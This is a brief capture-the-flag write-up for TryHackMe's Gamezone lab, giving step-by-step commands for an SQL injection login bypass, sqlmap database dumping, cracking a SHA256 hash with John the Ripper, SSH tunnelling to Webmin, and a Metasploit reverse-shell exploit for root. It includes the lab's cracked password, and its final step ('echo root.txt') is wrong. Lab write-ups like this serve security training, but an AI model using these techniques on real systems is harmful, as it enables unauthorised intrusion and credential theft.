# Writeup for [Gamezone](https://tryhackme.com/room/gamezone)

```
set -gx IP 10.10.188.215
```


## Task 1: Deploy the vulnerable machine

* reverse image search -> found `Agent 47`


## Task 2: Obtain access via SQLi

* insert `' or 1=1 -- -` in username input
* got redirected to `portal.php`


## Task 3: Using SQLMap

* capture request using burpsuite and select `Action > Copy to File`
* run sqlmap `sqlmap -r request.txt --dbms=mysql --dump`
* follow instructions


## Task 4: Cracking a password with JohnTheRipper

* Write the found password hash to file `echo "ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14" > hash.txt`
* Run JohnTheRipper `john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256`
* Found password: **videogamer124**
* Port scan `nmap -sV -A -Pn -oN nmap/initial $IP`
* Found open ssh port 22
* Connect with `ssh agent47@$IP` enter password **videogamer124**
* ls home folder and found **user.txt**
* read content of found file `cat user.txt`


## Task 5: Exposing services with reverse SSH tunnels

* list running sockets `ss -tulpn`
* ssh tunnel to local machine `ssh -L 10000:localhost:10000 agent47@$IP`
* visit with browser `localhost:10000`
* login with agent47:videogamer124
* found cms with version `Webmin:1.580`


## Task 6: Privilege Escalation with Metasploit

* use searchsploit to find exploit `searchsploit webmin 1.580`
* found rce
* **important**: ssh tunnel to local machine `ssh -L 10000:localhost:10000 agent47@$IP`
* starting msfconsole and use found exploit
* set payload *unix/tcp/reverse
* set rhosts 127.0.0.1
* set lport tun0
* exploit
* cd to /root
* read content `echo root.txt`
